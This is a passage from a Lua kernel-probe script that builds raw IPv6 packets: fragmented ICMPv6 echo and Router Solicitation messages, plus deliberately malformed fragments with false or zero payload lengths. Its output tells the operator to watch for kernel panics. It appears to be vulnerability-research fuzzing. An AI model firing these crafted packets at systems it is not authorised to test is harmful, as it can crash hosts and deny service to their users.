    print("  J3: same ID different sources: sent")
end

print("")
print("--- SECTION K: ICMPv6 fragment reassembly ---")
print("")

-- K1: Fragmented ICMPv6 Echo Request
-- ICMPv6 Echo: type=128, code=0, checksum(2), id(2), seq(2) = 8 bytes header
do
    local id = next_frag_id()
    -- First fragment: ICMPv6 echo header (8B) + 56B data = 64B
    local frag_hdr_len = 8
    local payload_len = 64
    local ipv6_payload = frag_hdr_len + payload_len
    local total = 40 + ipv6_payload
    local buf = memory.alloc(total + 8)

    build_ipv6_header(buf, 0, ipv6_payload, IPPROTO_FRAGMENT, nil, nil)
    build_frag_header(buf, 40, IPPROTO_ICMPV6, 0, true, id)

    -- ICMPv6 Echo Request at offset 48
    safe_wb(buf + 48, 128)    -- type = Echo Request
    safe_wb(buf + 49, 0)      -- code
    safe_ww(buf + 50, 0)      -- checksum (0 for now, loopback may not check)
    safe_ww(buf + 52, 0x4949) -- identifier
    safe_ww(buf + 54, 0x0001) -- sequence
    fill_payload(buf, 56, 56, 0xEE)

    send_pkt(buf, total, "K1a ICMPv6 echo frag off=0")

    -- Second fragment: more data
    local total2 = 40 + frag_hdr_len + 32
    local buf2 = memory.alloc(total2 + 8)
    build_ipv6_header(buf2, 0, frag_hdr_len + 32, IPPROTO_FRAGMENT, nil, nil)
    build_frag_header(buf2, 40, IPPROTO_ICMPV6, 64, false, id)
    fill_payload(buf2, 48, 32, 0xFF)
    send_pkt(buf2, total2, "K1b ICMPv6 echo frag off=64 last")
    print("  K1: fragmented ICMPv6 echo request: sent")
end

-- K2: Fragmented NDP Router Solicitation (type 133)
do
    local id = next_frag_id()
    local frag_hdr_len = 8
    local payload_len = 64
    local ipv6_payload = frag_hdr_len + payload_len
    local total = 40 + ipv6_payload
    local buf = memory.alloc(total + 8)

    build_ipv6_header(buf, 0, ipv6_payload, IPPROTO_FRAGMENT, nil, nil)
    build_frag_header(buf, 40, IPPROTO_ICMPV6, 0, true, id)

    -- Router Solicitation: type=133, code=0, checksum(2), reserved(4)
    safe_wb(buf + 48, 133)
    safe_wb(buf + 49, 0)
    safe_ww(buf + 50, 0)
    safe_wd(buf + 52, 0)
    fill_payload(buf, 56, 56, 0xAA)

    send_pkt(buf, total, "K2a NDP RS frag off=0")

    local total2 = 40 + frag_hdr_len + 32
    local buf2 = memory.alloc(total2 + 8)
    build_ipv6_header(buf2, 0, frag_hdr_len + 32, IPPROTO_FRAGMENT, nil, nil)
    build_frag_header(buf2, 40, IPPROTO_ICMPV6, 64, false, id)
    fill_payload(buf2, 48, 32, 0xBB)
    send_pkt(buf2, total2, "K2b NDP RS frag off=64 last")
    print("  K2: fragmented NDP Router Solicitation: sent")
end

print("")
print("--- SECTION L: Payload length attacks ---")
print("")

-- L1: IPv6 payload length doesn't match actual packet size
-- Set payload_len in IPv6 header to 256, but only send 8+32 = 40 actual bytes
do
    local id = next_frag_id()
    local frag_hdr_len = 8
    local actual_payload = 32
    local total = 40 + frag_hdr_len + actual_payload
    local buf = memory.alloc(total + 8)

    -- Lie about payload length
    build_ipv6_header(buf, 0, 256, IPPROTO_FRAGMENT, nil, nil)
    build_frag_header(buf, 40, IPPROTO_UDP, 0, true, id)
    fill_payload(buf, 48, actual_payload, 0xA7)
    send_pkt(buf, total, "L1 payload_len=256 actual=40")

    -- Complete with normal fragment
    local total2 = 40 + frag_hdr_len + 32
    local buf2 = memory.alloc(total2 + 8)
    build_ipv6_header(buf2, 0, frag_hdr_len + 32, IPPROTO_FRAGMENT, nil, nil)
    build_frag_header(buf2, 40, IPPROTO_UDP, 256, false, id)
    fill_payload(buf2, 48, 32, 0xA8)
    send_pkt(buf2, total2, "L1b completing with off=256")
    print("  L1: payload length mismatch (declared 256, sent 40): sent")
end

-- L2: Zero payload length in IPv6 header with fragment
do
    local id = next_frag_id()
    local total = 40 + 8 + 32
    local buf = memory.alloc(total + 8)
    build_ipv6_header(buf, 0, 0, IPPROTO_FRAGMENT, nil, nil)
    build_frag_header(buf, 40, IPPROTO_UDP, 0, true, id)
    fill_payload(buf, 48, 32, 0x00)
    send_pkt(buf, total, "L2 zero payload length")
    print("  L2: zero payload length with fragment: sent")
end

print("")

-- ============================================
-- Cleanup
-- ============================================
if raw6 then pcall(function() sc_close(uint64(raw6)) end) end
if raw4_fd then pcall(function() sc_close(uint64(raw4_fd)) end) end

print("=== PROBE 49b COMPLETE ===")
print("Total fragments sent: " .. sent)
print("Send errors: " .. errors)
print("")
print("KEY: If you are reading this, the process survived all " .. sent .. " fragment")
print("attacks. The kernel's IPv6 reassembly code handled overlapping fragments,")
print("queue exhaustion, huge totals, interleaved IDs, and extension header combos")
print("without crashing.")
print("")
print("LOOK FOR: kernel panic, process kill (missing COMPLETE message above),")
print("or any unexpected behavior between fragment pairs.")
